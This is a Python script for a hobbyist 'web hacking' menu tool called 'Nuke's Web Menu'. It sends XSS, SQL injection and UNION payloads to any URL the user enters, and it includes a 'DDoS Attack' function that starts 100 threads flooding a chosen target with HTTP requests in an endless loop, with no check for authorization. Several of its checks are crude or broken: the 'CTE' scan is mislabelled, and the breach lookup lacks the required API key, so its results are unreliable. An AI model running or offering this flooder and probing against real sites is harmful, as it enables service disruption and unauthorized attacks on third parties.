import os
import sys
import requests
import threading
import time
from colorama import Fore, Style
import random
import subprocess


def ascii_art():
    print(Fore.GREEN + """
███████╗██╗   ██╗██╗███████╗██████╗ ███████╗██╗   ██╗████████╗
██╔════╝██║   ██║██║██╔════╝██╔══██╗██╔════╝██║   ██║╚══██╔══╝
█████╗  ██║   ██║██║█████╗  ██████╔╝█████╗  ██║   ██║   ██║
██╔══╝  ██║   ██║██║██╔══╝  ██╔══██╗██╔══╝  ██║   ██║   ██║
███████╗╚██████╔╝██║███████╗██║  ██║███████╗╚██████╔╝   ██║
╚══════╝ ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝    ╚═╝
""")
    print(Fore.YELLOW + "Nuke’s Web Menu ;)\nMade by iNukedYou\nv0.1\nContact me on Discord - iNukedYou\n" + Style.RESET_ALL)
    print("-" * 50)

menu_options = {
    "1": "Check Web Headers",
    "2": "Scan for XSS",
    "3": "Scan for SQL Injection",
    "4": "CTE Vulnerability Scan",
    "5": "DDoS Attack",
    "6": "Data Breach Checker",
    "7": "OWASP ZAP Scan (Requires installation)",
    "8": "Nikto Scan (Requires installation)",
    "9": "All-in-One Scan",
    "10": "Exit"
}


def check_headers():
    url = input(Fore.CYAN + "Enter URL (e.g., https://example.com): " + Style.RESET_ALL)
    try:
        response = requests.get(url)
        print(Fore.GREEN + "\n[+] HTTP Headers:")
        for key, value in response.headers.items():
            print(f"{key}: {value}")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[-] Error: {e}")
    input("\nPress Enter to return to menu...")


def scan_xss():
    url = input(Fore.CYAN + "Enter URL with parameter (e.g., https://site.com/search?q=): " + Style.RESET_ALL)
    payload = "<script>alert('XSS')</script>"
    
    try:
        response = requests.get(url + payload)
        if payload in response.text:
            print(Fore.GREEN + "[+] Possible XSS vulnerability detected!")
        else:
            print(Fore.RED + "[-] No XSS detected.")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[-] Error: {e}")
    input("\nPress Enter to return to menu...")


def scan_sqli():
    url = input(Fore.CYAN + "Enter URL with parameter (e.g., https://site.com/page?id=): " + Style.RESET_ALL)
    payload = "' OR '1'='1' --"
    
    try:
        response = requests.get(url + payload)
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            print(Fore.GREEN + "[+] Possible SQL Injection vulnerability detected!")
        else:
            print(Fore.RED + "[-] No SQL Injection detected.")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[-] Error: {e}")
    input("\nPress Enter to return to menu...")


def scan_cte():
    url = input(Fore.CYAN + "Enter URL (e.g., https://site.com/page?id=): " + Style.RESET_ALL)
    payload = "' UNION SELECT NULL, NULL, NULL --"
    
    try:
        response = requests.get(url + payload)
        if "syntax" in response.text.lower():
            print(Fore.GREEN + "[+] Possible CTE vulnerability detected!")
        else:
            print(Fore.RED + "[-] No CTE vulnerability detected.")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[-] Error: {e}")
    input("\nPress Enter to return to menu...")


def ddos_attack():
    target = input(Fore.CYAN + "Enter target IP/Domain: " + Style.RESET_ALL)
    port = int(input(Fore.CYAN + "Enter target port: " + Style.RESET_ALL))
    packets = int(input(Fore.CYAN + "Enter number of packets: " + Style.RESET_ALL))

    def attack():
        while True:
            try:
                requests.get(f"http://{target}:{port}")
                print(Fore.RED + f"[*] Sent packet to {target}:{port}")
            except requests.exceptions.RequestException:
                pass

    threads = []
    for _ in range(100): 
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    print(Fore.YELLOW + "[+] Attack started! Press Ctrl+C to stop.")
    time.sleep(3)


def data_breach_checker():
    identifier = input(Fore.CYAN + "Enter email or username to check for breaches: " + Style.RESET_ALL)
    api_url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{identifier}"
    
    headers = {"User-Agent": "Nuke's Web Menu"}
    try:
        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            print(Fore.RED + f"[!] WARNING: {identifier} has been found in data breaches!")
        elif response.status_code == 404:
            print(Fore.GREEN + f"[+] {identifier} is safe (no known breaches).")
        else:
            print(Fore.YELLOW + f"[?] Unknown response. Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[-] Error: {e}")
    input("\nPress Enter to return to menu...")


def owasp_zap_scan():
    print(Fore.YELLOW + "[*] Running OWASP ZAP scan (requires installation and configuration)...")
    try:
        subprocess.run(["zap-cli", "quick-scan", "-r", "report.html", "https://example.com"], check=True)
        print(Fore.GREEN + "[+] OWASP ZAP scan completed!")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] Error running OWASP ZAP: {e}")
    input("\nPress Enter to return to menu...")


def nikto_scan():
    print(Fore.YELLOW + "[*] Running Nikto scan (requires installation)...")
    try:
        subprocess.run(["nikto", "-h", "https://example.com"], check=True)
        print(Fore.GREEN + "[+] Nikto scan completed!")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] Error running Nikto: {e}")
    input("\nPress Enter to return to menu...")


def all_in_one_scan():
    check_headers()
    scan_xss()
    scan_sqli()
    scan_cte()
    ddos_attack()
    data_breach_checker()
    owasp_zap_scan()
    nikto_scan()


if __name__ == "__main__":
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        ascii_art()  

        for key, value in menu_options.items():
            print(f"{Fore.CYAN}[{key}] {value}{Style.RESET_ALL}")

        choice = input("\nSelect an option: ")

        if choice == "1":
            check_headers()
        elif choice == "2":
            scan_xss()
        elif choice == "3":
            scan_sqli()
        elif choice == "4":
            scan_cte()
        elif choice == "5":
            ddos_attack()
        elif choice == "6":
            data_breach_checker()
        elif choice == "7":
            owasp_zap_scan()
        elif choice == "8":
            nikto_scan()
        elif choice == "9":
            all_in_one_scan()
        elif choice == "10":
            print(Fore.RED + "\nExiting..." + Style.RESET_ALL)
            sys.exit()
        else:
            print(Fore.RED + "\nInvalid choice. Try again." + Style.RESET_ALL)
            input("\nPress Enter to continue...")
